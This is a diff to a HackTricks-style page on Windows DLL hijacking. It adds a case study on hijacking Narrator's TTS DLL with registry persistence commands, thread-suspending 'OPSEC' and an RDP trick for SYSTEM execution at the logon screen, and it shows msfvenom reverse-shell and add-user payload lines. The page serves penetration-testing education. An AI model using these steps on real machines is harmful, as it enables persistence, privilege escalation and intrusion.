@@ -31,7 +31,7 @@ and just show the **File System Activity**:
 ![](<../../../images/image (153).png>)
 
 If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
-If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "\<exec name>", execute it, and stop capturing events**.
+If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" `<exec name>`, execute it, and stop capturing events**.
 
 ## Exploiting Missing Dlls
 
@@ -75,6 +75,9 @@ Notes/limitations
 - KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.
 
 Minimal C example (ntdll, wide strings, simplified error handling):
+
+<details>
+<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
 
 ```c
 #include <windows.h>
@@ -147,6 +150,8 @@ int wmain(void) {
 }
 ```
 
+</details>
+
 Operational usage example
 - Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
 - Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.
@@ -187,7 +192,7 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 
 You can also check the imports of an executable and the exports of a dll with:
 
-```c
+```bash
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
@@ -233,13 +238,16 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dl
 
 **Create a user (x86 I didn't see a x64 version):**
 
-```
+```bash
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 
 ### Your own
 
 Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.
+
+<details>
+<summary>C DLL template (Win10)</summary>
 
 ```c
 // Tested in Win10
@@ -262,6 +270,8 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 }
 ```
 
+</details>
+
 ```c
 // For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
 // For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
@@ -275,6 +285,9 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
     return TRUE;
 }
 ```
+
+<details>
+<summary>C++ DLL example with user creation</summary>
 
 ```c
 //x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
@@ -295,6 +308,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
   return 0;
 }
 ```
+
+</details>
+
+<details>
+<summary>Alternate C DLL with thread entry</summary>
 
 ```c
 //Another possible DLL
@@ -321,6 +339,54 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
     return TRUE;
 }
 ```
+
+</details>
+
+## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)
+
+Windows Narrator.exe still probes a predictable, language-specific localization DLL on start that can be hijacked for arbitrary code execution and persistence.
+
+Key facts
+- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
+- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
+- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.
+
+Discovery with Procmon
+- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
+- Start Narrator and observe the attempted load of the above path.
+
+Minimal DLL
+```c
+// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
+  if (r == DLL_PROCESS_ATTACH) {
+    // Optional OPSEC: DisableThreadLibraryCalls(h);
+    // Suspend/quiet Narrator main thread, then run payload
+    // (see PoC for implementation details)
+  }
+  return TRUE;
+}
+```
+
+OPSEC silence
+- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.
+
+Trigger and persistence via Accessibility configuration
+- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
+- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
+- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.
+
+RDP-triggered SYSTEM execution (lateral movement)
+- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
+- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
+- Execution stops when the RDP session closes—inject/migrate promptly.
+
+Bring Your Own Accessibility (BYOA)
+- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.
+
+Notes
+- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
+- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.
 
 ## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe
 
@@ -356,23 +422,16 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
 3. If an administrator is logged in when the task executes, the malicious DLL runs in the administrator's session at medium integrity.
 4. Chain standard UAC bypass techniques to elevate from medium integrity to SYSTEM privileges.
 
-### Mitigation
-
-Lenovo released UWP version **1.12.54.0** via the Microsoft Store, which installs TPQMAssistant under `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, removes the vulnerable scheduled task, and uninstalls the legacy Win32 components.
-
 ## References
 
 - [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
 - [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
-
-
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
 - [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
-
-
 - [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
+- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
+- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
+- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
 
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
